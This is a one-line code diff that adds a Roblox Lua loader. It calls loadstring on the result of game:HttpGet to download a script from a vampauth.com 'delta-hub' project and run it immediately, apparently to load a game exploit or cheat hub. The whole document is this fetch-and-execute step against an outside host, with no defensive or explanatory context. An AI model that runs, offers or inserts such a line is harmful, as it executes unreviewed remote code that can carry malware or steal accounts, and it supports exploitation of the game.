@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://vampauth.com/api/projects/0462e948-9a7f-4f3b-9c65-cfe942cc5862/scripts/delta-hub"))()
